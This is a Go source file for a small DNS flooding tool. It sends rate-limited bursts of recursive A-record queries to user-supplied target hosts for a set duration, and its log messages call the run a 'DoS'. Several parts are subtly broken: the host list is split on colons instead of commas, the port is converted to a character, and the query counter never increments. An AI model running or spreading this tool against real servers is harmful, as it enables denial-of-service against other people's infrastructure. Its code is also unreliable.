package main

import (
    "github.com/miekg/dns"
    "strings"
    "log"
    "flag"
    "net"
    "time"
    "runtime"
    "sync"
)

var wg sync.WaitGroup

var protoFlag = flag.String("p","","Specify protocol to use for DoS")
var destPort = flag.Int("P",53,"Specify destination port for DoS")
var destIPs = flag.String("d","","Specify an single host or a list of hosts seperated by comma (example: 1.2.3.4 or 1.2.3.4,2.3.4.5)")
var rateFlag = flag.Int("r",1,"Specify the amount of protocol requests per second")
var durationFlag = flag.Int("D",60,"Specify the total duration of the test")

func dnsQuery(config *dns.ClientConfig, queryCounter int) {
    defer wg.Done()
    dnsClient := new(dns.Client)
    message := new(dns.Msg)
    message.SetQuestion(dns.Fqdn("cnn.com"), dns.TypeA)
    message.RecursionDesired = true

    response, _, err := dnsClient.Exchange(message, net.JoinHostPort(config.Servers[0], "53"))

    if err != nil {
        //log.Println(err)
    }

    if response == nil {
    } else {
        if response.Rcode != dns.RcodeSuccess {
            log.Println(" query fail")
        }
        //log.Println(rtt)
        queryCounter = queryCounter + 1
    }
}


func main() {
    runtime.GOMAXPROCS(runtime.NumCPU() * 2)
    var runCounter int
    runCounter = 0
    var queryCounter int
    queryCounter = 0

    flag.Parse()
    log.Printf("Starting DoS against %s on Port %d via protocol %s at rate %d/s", *destIPs, *destPort, *protoFlag, *rateFlag)
    config := new(dns.ClientConfig)
    config.Servers = strings.Split(*destIPs,":")
    config.Port = string(*destPort)
    config.Ndots = 1
    config.Timeout = 1
    config.Attempts = 1
    ticker := time.NewTicker(time.Second * 1)

    for t := range ticker.C {
        runCounter = runCounter + 1
        log.Println(t)
        for i := 0; i < *rateFlag; i++ {
            wg.Add(1)
            go dnsQuery(config, queryCounter)
        }
        if runCounter == *durationFlag {
            wg.Wait()
            log.Printf("Completed %d queries over %d runs to %s",queryCounter,runCounter ,*destIPs)
            break
        }
    }

}
